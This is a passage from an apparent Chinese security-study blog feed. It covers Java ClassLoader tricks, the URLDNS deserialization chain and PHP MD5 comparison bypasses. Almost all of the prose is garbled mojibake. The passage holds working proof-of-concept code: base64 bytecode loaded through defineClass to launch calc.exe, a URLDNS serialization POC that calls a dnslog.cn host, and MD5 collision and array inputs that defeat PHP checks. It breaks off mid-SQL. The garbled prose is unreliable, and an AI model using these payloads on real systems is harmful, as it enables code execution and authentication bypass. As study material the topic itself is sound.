&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>è¿™é‡Œç”¨åˆ°çš„<code>loadClass</code>ä½œç”¨ï¼šæ˜¯ä»å·²åŠ è½½çš„ç±»ç¼“å­˜ã€çˆ¶åŠ è½½å™¨ç­‰ä½ç½®å¯»æ‰¾ç±»ï¼Œåœ¨å‰é¢æ²¡æœ‰æ‰¾åˆ°çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡Œ findClassã€‚</strong></p><p><strong><code>findClass</code>ä½œç”¨ï¼šæ ¹æ®URLæŒ‡å®šçš„æ–¹å¼æ¥åŠ è½½ç±»çš„å­—èŠ‚ç ï¼Œå¯èƒ½ä¼šåœ¨æœ¬åœ°ç³»ç»Ÿï¼ŒjaråŒ…æˆ–è¿œç¨‹httpæœåŠ¡å™¨ä¸Šè¯»å–å­—èŠ‚ç ï¼Œç„¶åå°†å…¶äº¤ç»™defineClassã€‚</strong></p><p>åœ¨å¯¹åº”çš„<code>.class</code>æ–‡ä»¶ä¸‹å¼€å¯å¯¹åº”çš„æœåŠ¡ã€‚ï¼ˆphpstudyã€pythonå‡å¯ï¼‰ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012015822.png" alt="QQæˆªå›¾20220301192930"></p><p>è¿è¡Œè¿œç¨‹åŠ è½½ï¼Œæ‰§è¡Œåå°±ä¼šå¼¹å‡ºè®¡ç®—å™¨ã€‚ï¼ˆè¿™é‡Œå°è¯•äº†åŠ <code>\</code>æˆ–è€…ä¸åŠ éƒ½å¯ä»¥å®ç°ã€‚ï¼‰</p><h2 id="ClassLoader-defineClassç›´æ¥åŠ è½½"><a href="#ClassLoader-defineClassç›´æ¥åŠ è½½" class="headerlink" title="ClassLoader#defineClassç›´æ¥åŠ è½½"></a>ClassLoader#defineClassç›´æ¥åŠ è½½</h2><p><strong>è¿™é‡Œæ‰€è¯´çš„<code>denfineClass</code>ä½œç”¨ï¼šç›´æ¥å¤„ç†ä¼ å…¥çš„å­—èŠ‚ç ï¼Œå°†å…¶å¤„ç†æˆjavaç±»ã€‚</strong></p><p>è¿™é‡Œå°±è®©æˆ‘æƒ³èµ·åå°„çš„æ—¶å€™<code>Class.forname</code>ã€‚</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;ç±»å&quot;</span>)</span>é»˜è®¤ä¼šåˆå§‹åŒ–è¢«åŠ è½½ç±»çš„é™æ€å±æ€§å’Œæ–¹æ³•ï¼Œå¦‚æœä¸å¸Œæœ›åˆå§‹åŒ–ç±»å¯ä»¥ä½¿ç”¨<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;ç±»å&quot;</span>, æ˜¯å¦åˆå§‹åŒ–ç±», ç±»åŠ è½½å™¨)</span>ï¼Œè€Œ<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassLoader</span>.</span></span>loadClassé»˜è®¤ä¸ä¼šåˆå§‹åŒ–ç±»æ–¹æ³•ã€‚<br></code></pre></td></tr></table></figure><p>è¿™é‡Œåœ¨è·Ÿä¸€äº›å¤§ä½¬çš„åšå®¢çš„æ—¶å€™ï¼Œå‘ç°è®¸å¤šéƒ½æ˜¯ç”¨base64çš„æ–¹æ³•å»å¤ç°çš„ã€‚ç”¨åˆ°linuxä¸‹çš„å‘½ä»¤ã€‚ï¼ˆå¼ºçƒˆæ¨èä¹°ä¸ªvpsï¼‰ã€‚è®°å¾—åˆ é™¤<code>\n</code>æ¢è¡Œç¬¦ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012015420.png" alt="QQæˆªå›¾20220301200451"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoTwo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.ClassLoader&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defineClass</span> <span class="hljs-operator">=</span> aClass.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>        defineClass.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAHwoABgASCgATABQIABUKABMAFgcAFwcAGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAMTHhzdzZhL0Vpdmw7AQAKRXhjZXB0aW9ucwcAGQEAClNvdXJjZUZpbGUBAAlFaXZsLmphdmEMAAcACAcAGgwAGwAcAQAIY2FsYy5leGUMAB0AHgEACnhzdzZhL0VpdmwBABBqYXZhL2xhbmcvT2JqZWN0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAEAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAGAAQABwANAAgACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAAAAAIAEQ==&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">evil</span> <span class="hljs-operator">=</span>(Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="hljs-string">&quot;xsw6a.Eivl&quot;</span>, decode, <span class="hljs-number">0</span>, decode.length);<br>        evil.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯å‘¢ï¼Ÿè¿™ä¸ª<code>defineClass</code>ä½œç”¨åŸŸè¢«<code>protect</code>é™åˆ¶äº†ã€‚æ— æ³•åœ¨å¤–éƒ¨è®¿é—®ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012018186.png" alt="QQæˆªå›¾20220301201752"></p><p>å¾ˆå·§çš„æ˜¯<strong>Templateslmp</strong>å´è°ƒç”¨äº†defineClassæ–¹æ³•ã€‚<br>ä¸‹é¢ç»§ç»­å¤ä¹ <strong>Templateslmpçš„åˆ©ç”¨</strong>ã€‚å…¶å®æœ¬æ¬¡è®²çš„éƒ½æ˜¯é“ºå«ã€‚æˆ‘ä¹Ÿå°±æ²¡æœ‰è·Ÿè¿›å»è°ƒè¯•ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>URLDNSé“¾</title>
    <link href="/2022/03/01/URLDNS%E9%93%BE/"/>
    <url>/2022/03/01/URLDNS%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="URLDNSé“¾"><a href="#URLDNSé“¾" class="headerlink" title="URLDNSé“¾"></a>URLDNSé“¾</h1><h2 id="ä½œç”¨"><a href="#ä½œç”¨" class="headerlink" title="ä½œç”¨"></a>ä½œç”¨</h2><p>è¯¥é“¾å­å¸¸é…åˆdnslogå»éªŒè¯æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–ï¼ˆå› ä¸ºè¯¥é“¾å­ä¸å—jdkç‰ˆæœ¬é™åˆ¶ï¼Œä¸”åªä¾èµ–åŸç”Ÿç±»ã€‚ï¼‰</p><h2 id="åˆ©ç”¨é“¾"><a href="#åˆ©ç”¨é“¾" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap.readObject()<br>    HashMap.putVal()<br>        HashMap.hash()<br>            URL.hashCode()<br></code></pre></td></tr></table></figure><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><h3 id="HashMapä¸ºä»€ä¹ˆè‡ªå·±å®ç°äº†writeObjectï¼ˆï¼‰å’ŒreadObjectï¼ˆï¼‰"><a href="#HashMapä¸ºä»€ä¹ˆè‡ªå·±å®ç°äº†writeObjectï¼ˆï¼‰å’ŒreadObjectï¼ˆï¼‰" class="headerlink" title="HashMapä¸ºä»€ä¹ˆè‡ªå·±å®ç°äº†writeObjectï¼ˆï¼‰å’ŒreadObjectï¼ˆï¼‰"></a>HashMapä¸ºä»€ä¹ˆè‡ªå·±å®ç°äº†writeObjectï¼ˆï¼‰å’ŒreadObjectï¼ˆï¼‰</h3><p>é¦–å…ˆæ˜ç™½ä¸€ç‚¹ã€‚å¦‚æœååºåˆ—åŒ–è¯¥ç±»çš„æ—¶å€™ï¼Œè¯¥ç±»å®ç°äº†writeObjectï¼ˆï¼‰å’ŒreadObjectï¼ˆï¼‰ï¼Œå°±ä¼šæ‰§è¡Œè¯¥ç±»çš„è¿™ä¸¤ç±»æ–¹æ³•ã€‚</p><p>è·Ÿç€åˆ©ç”¨é“¾æ¥åˆ†æã€‚</p><h3 id="HashMap-readObject"><a href="#HashMap-readObject" class="headerlink" title="HashMap.readObject()"></a>HashMap.readObject()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span><br>        s.defaultReadObject();<br>        reinitialize();<br>        <span class="hljs-keyword">if</span> (loadFactor &lt;= <span class="hljs-number">0</span> || Float.isNaN(loadFactor))<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal load factor: &quot;</span> +<br>                                             loadFactor);<br>        s.readInt();                <span class="hljs-comment">// Read and ignore number of buckets</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">mappings</span> <span class="hljs-operator">=</span> s.readInt(); <span class="hljs-comment">// Read number of mappings (size)</span><br>        <span class="hljs-keyword">if</span> (mappings &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal mappings count: &quot;</span> +<br>                                             mappings);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mappings &gt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// (if zero, use defaults)</span><br>            <span class="hljs-comment">// Size the table using given load factor only if within</span><br>            <span class="hljs-comment">// range of 0.25...4.0</span><br>            <span class="hljs-type">float</span> <span class="hljs-variable">lf</span> <span class="hljs-operator">=</span> Math.min(Math.max(<span class="hljs-number">0.25f</span>, loadFactor), <span class="hljs-number">4.0f</span>);<br>            <span class="hljs-type">float</span> <span class="hljs-variable">fc</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>)mappings / lf + <span class="hljs-number">1.0f</span>;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">cap</span> <span class="hljs-operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?<br>                       DEFAULT_INITIAL_CAPACITY :<br>                       (fc &gt;= MAXIMUM_CAPACITY) ?<br>                       MAXIMUM_CAPACITY :<br>                       tableSizeFor((<span class="hljs-type">int</span>)fc));<br>            <span class="hljs-type">float</span> <span class="hljs-variable">ft</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>)cap * lf;<br>            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?<br>                         (<span class="hljs-type">int</span>)ft : Integer.MAX_VALUE);<br>            <span class="hljs-meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br>                Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>[cap];<br>            table = tab;<br><br>            <span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>ä»£ç éå¸¸é•¿ï¼Œè¿™é‡Œåªè¯´å…³é”®çš„éƒ¨åˆ†ï¼ˆ<code>readObjectï¼ˆï¼‰</code>éƒ¨åˆ†ï¼‰ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203010002478.png" alt="QQæˆªå›¾20220228232632"></p><p>è·Ÿè¿›<code>hashï¼ˆkeyï¼‰!</code><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203010002791.png" alt="QQæˆªå›¾20220228232754"></p><p>è¿™é‡Œreturnäº†<code>key.hashCode</code>ï¼Œé‚£ä¹ˆå“ªä¸ªç±»åˆè°ƒç”¨äº†<code>hashCode</code>å‘¢ï¼Ÿ</p><p>è·Ÿç€åˆ©ç”¨é“¾åˆ†æï¼Œè¿™é‡Œçš„URLç±»ä½¿ç”¨äº†<code>hashcode</code></p><h3 id="URL-hashCode"><a href="#URL-hashCode" class="headerlink" title="URL.hashCode()"></a>URL.hashCode()</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203010002555.png" alt="QQæˆªå›¾20220228233214"></p><p>è·Ÿè¿›è¿™é‡Œçš„<code>hashCode</code>ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203010002994.png" alt="QQæˆªå›¾20220228233327"></p><p>è¿™é‡Œå°±è§¦å‘äº†è®¿é—®dnslogã€‚</p><h3 id="æ³¨æ„ç‚¹"><a href="#æ³¨æ„ç‚¹" class="headerlink" title="æ³¨æ„ç‚¹"></a>æ³¨æ„ç‚¹</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UrlDnsDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException, NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://xen3dy.dnslog.cn&quot;</span>);<br>        url.hashCode();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„è¿™ä¸ªä»£ç ä¼šä¸ä¼šè§¦å‘dnslogå‘¢ï¼Ÿç­”æ¡ˆæ˜¯ä¼šã€‚è·Ÿè¿›å»çœ‹çœ‹ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203010002986.png" alt="QQæˆªå›¾20220228234601"></p><p>åŒæ ·ä¼šå¾€ä¸‹èµ°,æ¥ç€è§¦å‘<code>getHsotAddress()</code>ã€‚é‚£å¦‚æœæ˜¯è¿™æ ·åœ¨åºåˆ—åŒ–çš„æ—¶å€™å°±å¯ä»¥è§¦å‘dnslogäº†ï¼Œæ ¹æœ¬åœ¨å®æˆ˜ä¸­ä¹Ÿèµ·ä¸åˆ°éªŒè¯çš„ä½œç”¨ã€‚<br>é‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬å°±è¦å»ä¿®æ”¹è¿™ä¸ª<code>hashCode</code>çš„å€¼ã€‚æ€æ ·ä¿®æ”¹å‘¢ï¼Ÿå…ˆæ¥çœ‹çœ‹<code>hashCode</code>æ˜¯ä»€ä¹ˆå±æ€§å§ï¼Ÿ<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203010002790.png" alt="QQæˆªå›¾20220228235155"></p><p>å°±åå°„ä¿®æ”¹è¯¥å±æ€§ã€‚</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UrlDns</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://u5gnvq.dnslog.cn&quot;</span>);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">urlClass</span> <span class="hljs-operator">=</span> URL.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">haseCode</span> <span class="hljs-operator">=</span> urlClass.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        haseCode.setAccessible(<span class="hljs-literal">true</span>);<br>        haseCode.set(url, <span class="hljs-number">2213</span>);<br><br>        hashMap.put(url, <span class="hljs-number">1</span>);<br><br>        haseCode.set(url, -<span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(hashMap);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å…³äºMD5</title>
    <link href="/2022/02/28/%E5%85%B3%E4%BA%8EMD5/"/>
    <url>/2022/02/28/%E5%85%B3%E4%BA%8EMD5/</url>
    
    <content type="html"><![CDATA[<h1 id="å…³äºMD5"><a href="#å…³äºMD5" class="headerlink" title="å…³äºMD5"></a>å…³äºMD5</h1><h2 id="è¿ç®—ç¬¦"><a href="#è¿ç®—ç¬¦" class="headerlink" title="è¿ç®—ç¬¦"></a>è¿ç®—ç¬¦</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131963.png"></p><h2 id="â€²-x3D-x3D-â€²"><a href="#â€²-x3D-x3D-â€²" class="headerlink" title="â€²&#x3D;&#x3D;â€²"></a>â€²&#x3D;&#x3D;â€²</h2><p>ä¼šå…ˆå°†å­—ç¬¦ä¸²æ¢æˆç›¸åŒç±»å‹ï¼Œå†ä½œæ¯”è¾ƒï¼Œå±äºå¼±ç±»å‹æ¯”è¾ƒã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-number">1</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;1aaa500&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>==<span class="hljs-variable">$b</span>);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131909.png"></p><h2 id="â€²-x3D-x3D-x3D-â€²"><a href="#â€²-x3D-x3D-x3D-â€²" class="headerlink" title="â€²&#x3D;&#x3D;&#x3D;â€²"></a>â€²&#x3D;&#x3D;&#x3D;â€²</h2><p>ä¼šåŒæ—¶æ¯”è¾ƒå­—ç¬¦ä¸²çš„å€¼å’Œç±»å‹ã€‚ï¼ˆä¸ä¸€ä¸€éªŒè¯ï¼‰ã€‚</p><h2 id="md5å¼±æ¯”è¾ƒ"><a href="#md5å¼±æ¯”è¾ƒ" class="headerlink" title="md5å¼±æ¯”è¾ƒ"></a>md5å¼±æ¯”è¾ƒ</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]!=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]&amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>])==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Xsw6a_a&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">a</span>=QNKCDZO&amp;b=aabg7XSs<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131242.png" alt="QQæˆªå›¾20220227222344"></p><p>è¿™é‡Œçš„ä¸¤ä¸ªaï¼Œbã€‚åœ¨MD5åŠ å¯†åå˜æˆå‡ä¸º0eå¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œè€Œåˆé€šè¿‡å¼±ç±»å‹æ¯”è¾ƒå˜ä¸º0&#x3D;0ã€‚</p><h2 id="md5å¼ºæ¯”è¾ƒ"><a href="#md5å¼ºæ¯”è¾ƒ" class="headerlink" title="md5å¼ºæ¯”è¾ƒ"></a>md5å¼ºæ¯”è¾ƒ</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]!==<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]&amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>])===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Xsw6a&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131276.png" alt="QQæˆªå›¾20220227222810"></p><p><strong>md5å¼ºæ¯”è¾ƒï¼Œæ­¤æ—¶å¦‚æœä¼ å…¥çš„ä¸¤ä¸ªå‚æ•°ä¸æ˜¯å­—ç¬¦ä¸²ï¼Œè€Œæ˜¯æ•°ç»„ï¼Œmd5()å‡½æ•°æ— æ³•è§£å‡ºå…¶æ•°å€¼ï¼Œè€Œä¸”ä¸ä¼šæŠ¥é”™ï¼Œå°±ä¼šå¾—åˆ°&#x3D;&#x3D;&#x3D;å¼ºæ¯”è¾ƒçš„å€¼ç›¸ç­‰</strong></p><h2 id="ç‰¹å®šæ¡ä»¶ä¸‹çš„MDéªŒè¯ç»•è¿‡"><a href="#ç‰¹å®šæ¡ä»¶ä¸‹çš„MDéªŒè¯ç»•è¿‡" class="headerlink" title="ç‰¹å®šæ¡ä»¶ä¸‹çš„MDéªŒè¯ç»•è¿‡"></a>ç‰¹å®šæ¡ä»¶ä¸‹çš„MDéªŒè¯ç»•è¿‡</h2><p>ä¹‹å‰å°±æ˜¯æœ‰ä¸€é“é¢˜åˆ·åˆ°è¿‡ã€‚ä¹Ÿæ˜¯åœ¨buuctfä¸Šã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">Select</span> <span class="hljs-operator">*</span> <span 